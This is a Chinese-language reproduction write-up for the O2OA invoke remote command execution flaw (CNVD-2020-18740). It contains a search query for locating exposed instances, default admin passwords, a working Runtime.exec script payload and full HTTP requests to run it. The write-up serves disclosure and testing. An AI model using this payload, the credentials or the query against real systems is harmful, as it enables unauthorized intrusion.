# O2OA invoke 后台远程命令执行漏洞 CNVD-2020-18740

## 漏洞描述

O2OA 是一款开源免费的企业及团队办公平台，提供门户管理、流程管理、信息管理、数据管理四大平台，集工作汇报、项目协作、移动 OA、文档分享、流程审批、数据协作等众多功能，满足企业各类管理和协作需求。 O2OA 系统 invoke 接口存在远程代码执行漏洞。攻击者可利用漏洞执行任意代码。此漏洞在 O2OA 7.2.7 版本得到修复。

参考链接：

- https://www.cnvd.org.cn/flaw/show/CNVD-2020-18740

## 披露时间

2020-04-06

## 漏洞影响

```
O2OA 6.x
```

## 网络测绘

```
title=="O2OA"
```

## 环境搭建

在 [官网下载](https://www.o2oa.net/download.html) 一个 6.2.0 版本，本地搭建测试：

```
unzip o2server-6.2.0-linux-x64.zip 
cd o2server
./start_linux.sh
```

![](images/O2OA%20invoke%20后台远程命令执行漏洞%20CNVD-2020-18740/image-20250228143549531.png)

## 漏洞复现

默认密码登录后台 `xadmin/o2`（或 `xadmin/o2oa@2022`），点击 `Service Platform` 进入服务平台：

![](images/O2OA%20invoke%20后台远程命令执行漏洞%20CNVD-2020-18740/image-20250228150153382.png)

点击 `Create Service` 创建一个服务：

![](images/O2OA%20invoke%20后台远程命令执行漏洞%20CNVD-2020-18740/image-20250228150214613.png)

填写必填项，写入 payload：

```
var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("id").getInputStream()));

var result = [];
while (true) {
    var oneline = bufReader.readLine();
    result.push(oneline);
    if (!oneline) break;
}
var result = { "Result": result };
this.response.setBody(result, "application/json"); 
```

![](images/O2OA%20invoke%20后台远程命令执行漏洞%20CNVD-2020-18740/image-20250228150105054.png)

部分版本可以直接执行，有些版本需要构造请求包：

```
POST /x_program_center/jaxrs/invoke?v=6.1 HTTP/1.1
Host: 10.0.12.15:20030
Accept: */*
Referer: http://10.0.12.15/
Accept-Encoding: gzip, deflate
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6788.76 Safari/537.36
Content-Type: application/json; charset=UTF-8
Origin: http://10.0.12.15
authorization: PfyuxmzgIzrLF0IUhEF-rgO3PHNy_z4650QnO7mEHhA
Content-Length: 1048

{"id":"test","name":"test","enableToken":false,"alias":"","description":"","validated":true,"enable":true,"text":"var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"id\").getInputStream()));\n\nvar result = [];\nwhile (true) {\n    var oneline = bufReader.readLine();\n    result.push(oneline);\n    if (!oneline) break;\n}\nvar result = { \"Result\": result };\nthis.response.setBody(result, \"application/json\"); ","remoteAddrRegex":"","createTime":"2025-02-28 15:54:17","updateTime":"2025-02-28 15:54:17"}
```

![](images/O2OA%20invoke%20后台远程命令执行漏洞%20CNVD-2020-18740/image-20250228160252832.png)

创建成功后访问接口执行系统命令：

```
POST /x_program_center/jaxrs/invoke/test/execute HTTP/1.1
Host: 10.0.12.15:20030
Accept: */*
Referer: http://10.0.12.15/
Accept-Encoding: gzip, deflate
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6788.76 Safari/537.36
Content-Type: application/json; charset=UTF-8
authorization: PfyuxmzgIzrLF0IUhEF-rgO3PHNy_z4650QnO7mEHhA
Content-Length: 1048
```

![](images/O2OA%20invoke%20后台远程命令执行漏洞%20CNVD-2020-18740/image-20250228160439089.png)

## 漏洞修复

建议升级 O2OA 最新版本： https://www.o2oa.net/download.html
